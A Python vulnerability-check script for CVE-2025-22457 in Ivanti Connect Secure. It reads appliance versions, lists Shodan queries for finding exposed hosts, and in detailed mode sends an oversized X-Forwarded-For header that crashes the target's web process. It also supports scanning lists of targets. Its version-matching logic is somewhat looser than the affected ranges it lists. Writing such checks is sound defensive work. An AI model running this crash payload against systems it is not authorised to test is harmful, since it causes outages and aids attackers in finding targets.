"""
CVE-2025-22457 – Ivanti Connect Secure Stack-Based Buffer Overflow Exploit Check

Severity: Critical
CWE: CWE-121 – Stack-Based Buffer Overflow
CVSS: 9.0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H)
Product: Ivanti Connect Secure, Ivanti Policy Secure, Ivanti ZTA Gateways
Affected Versions:
  - Connect Secure < 22.7R2.6
  - Policy Secure < 22.7R1.4
  - ZTA Gateways < 22.8R2.2

Description:
  This script tests for the presence of CVE-2025-22457, a critical vulnerability in Ivanti Connect Secure,
  which allows a remote unauthenticated attacker to crash the web process via a long X-Forwarded-For header.

  In detailed mode, the vulnerability is confirmed if:
    1. A pre-check GET request returns HTTP 200
    2. A POST request with the crafted payload receives no response (safe crash)
    3. A follow-up GET receives HTTP 200, verifying the previous no-response was not incidental

  If this sequence is observed, the system is marked as vulnerable.
  A vulnerable system will generate the log on the server appliance:
    ERROR31093: Program web recently failed.

References:
  - https://labs.watchtowr.com/is-the-sofistication-in-the-room-with-us-x-forwarded-for-and-ivanti-connect-secure-cve-2025-22457
  - https://www.cvedetails.com/cve/CVE-2025-22457
  - https://www.redlinecybersecurity.com/blog/cve-2025-22457-python-exploit-poc-scanner-to-detect-ivanti-connect-secure-rce

Metadata:
  CVE ID: CVE-2025-22457
  Tags: cve, cve2025, ivanti, connect-secure, crash, buffer-overflow
  Shodan Query: http.title:"ivanti connect secure"
  Shodan Query: http.favicon.hash:-485487831
"""

import requests
import argparse
import time
import re
from packaging import version

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# ANSI color codes for terminal output
class Colors:
    YELLOW = "\033[93m"  # VULNERABLE
    GREEN = "\033[92m"   # Expected / safe behavior
    GRAY = "\033[90m"    # Logs, info, less important
    RESET = "\033[0m"

# Paths tested for CVE-2025-22457
PATHS = [
    "/dana-na/auth/url_default/welcome.cgi",
    "/dana-na/setup/psaldownload.cgi"
]

HEADERS = {
    "User-Agent": "Mozilla/5.0",
}

PAYLOAD_HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "X-Forwarded-For": "1" * 2048,
}

TIMEOUT_NORMAL = 5
TIMEOUT_PAYLOAD = 10

def safe_request(method, url, headers, timeout):
    try:
        if method == "GET":
            return requests.get(url, headers=headers, timeout=timeout, verify=False)
        elif method == "POST":
            return requests.post(url, headers=headers, timeout=timeout, verify=False)
    except requests.exceptions.RequestException:
        return None

# Thanks @ruppde https://github.com/projectdiscovery/nuclei-templates/pull/11895#issuecomment-2781516659
def grab_version_info(target):
    version_url = f"{target}/dana-na/auth/url_admin/welcome.cgi?type=inter"
    try:
        r = requests.get(version_url, timeout=5, verify=False)
        if r.status_code == 200:
            product_name = re.search(r'NAME="ProductName"\s+VALUE="([^"]+)"', r.text)
            product_version = re.search(r'NAME="ProductVersion"\s+VALUE="([^"]+)"', r.text)

            if product_name and product_version:
                name = product_name.group(1)
                ver_str = product_version.group(1)
                print(f"{Colors.GREEN}Detected {name} Version: {ver_str}{Colors.RESET}")

                # Passive vulnerability logic
                if ver_str.startswith("9."):
                    print(f"{Colors.YELLOW}PASSIVE VULNERABILITY DETECTED: 9.x versions are known to be vulnerable.{Colors.RESET}")
                else:
                    try:
                        parsed_ver = version.parse(ver_str)
                        if parsed_ver < version.parse("22.7"):
                            print(f"{Colors.YELLOW}PASSIVE VULNERABILITY DETECTED: Version {ver_str} is older than 22.7.{Colors.RESET}")
                        else:
                            print(f"{Colors.GREEN}Version {ver_str} appears to be patched (22.7+).{Colors.RESET}")
                    except Exception:
                        print(f"{Colors.GRAY}Could not parse version string: {ver_str}{Colors.RESET}")
                return version_url

        print(f"{Colors.GRAY}Unable to determine version from passive check.{Colors.RESET}")
    except Exception:
        print(f"{Colors.GRAY}Version grab failed (request error).{Colors.RESET}")


def detailed_check(target):
    print(f"\n{Colors.GRAY}Starting detailed check on {target}{Colors.RESET}")
    vulnerable_paths = []

    # Passive version grab (new)
    versionURL = grab_version_info(target)
    if versionURL:
      vulnerable_paths.append(versionURL)

    for path in PATHS:
        full_url = f"{target}{path}"
        print(f"\n{Colors.GRAY}Testing path: {path}{Colors.RESET}")

        # Step 1: Pre-check
        r1 = safe_request("GET", full_url, HEADERS, TIMEOUT_NORMAL)
        if not r1 or r1.status_code != 200:
            print(f"{Colors.GRAY}Pre-check failed (status: {r1.status_code if r1 else 'No response'}), skipping...{Colors.RESET}")
            continue
        print(f"{Colors.GREEN}Pre-check successful (HTTP 200){Colors.RESET}")

        # Step 2: Send payload
        r2 = safe_request("POST", full_url, PAYLOAD_HEADERS, TIMEOUT_PAYLOAD)
        if r2:
            print(f"{Colors.GRAY}Payload returned HTTP {r2.status_code}. Not vulnerable or crash failed.{Colors.RESET}")
            continue
        print(f"{Colors.GREEN}No response to payload (expected crash behavior).{Colors.RESET}")

        # Step 3: Follow-up GET
        time.sleep(1)
        r3 = safe_request("GET", full_url, HEADERS, TIMEOUT_NORMAL)
        if r3 and r3.status_code == 200:
            print(f"{Colors.GREEN}Follow-up request returned HTTP 200. Crash condition verified.{Colors.RESET}")
            print(f"{Colors.YELLOW}VULNERABLE: {target}{path}{Colors.RESET}")
            vulnerable_paths.append(path)
        else:
            print(f"{Colors.GRAY}Follow-up request failed. Could not confirm condition — skipping.{Colors.RESET}")

    return vulnerable_paths

def quick_check(target):
    print(f"\n{Colors.GRAY}Starting quick check (version detection only) on {target}{Colors.RESET}")
    # Passive version grab (new)
    grab_version_info(target)

def process_targets(targets, mode, output_file=None):
    all_vulnerable = []

    for target in targets:
        target = target.strip()
        if not target or target.startswith("#"):
            continue

        if not target.startswith("http"):
            target = f"https://{target}"

        if mode == "quick":
            result = quick_check(target)
        else:
            result = detailed_check(target)

        if result:
            for path in result:
                entry = f"{target}{path}"
                all_vulnerable.append(entry)

    if output_file:
        with open(output_file, "w") as f:
            for v in all_vulnerable:
                f.write(v + "\n")
        print(f"\n{Colors.GREEN}Vulnerable targets written to: {output_file}{Colors.RESET}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Check for CVE-2025-22457 in Ivanti Connect Secure.")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--target", help="Single target base URL (e.g., https://1.2.3.4)")
    group.add_argument("--input", help="File with a list of target URLs or IPs")
    parser.add_argument("--output", help="Optional output file to save vulnerable results")
    parser.add_argument("--mode", choices=["quick", "detailed"], default="quick", help="Scan mode: quick or detailed")

    args = parser.parse_args()

    if args.input:
        with open(args.input, "r") as f:
            targets = f.readlines()
        process_targets(targets, args.mode, args.output)
    else:
        process_targets([args.target], args.mode, args.output)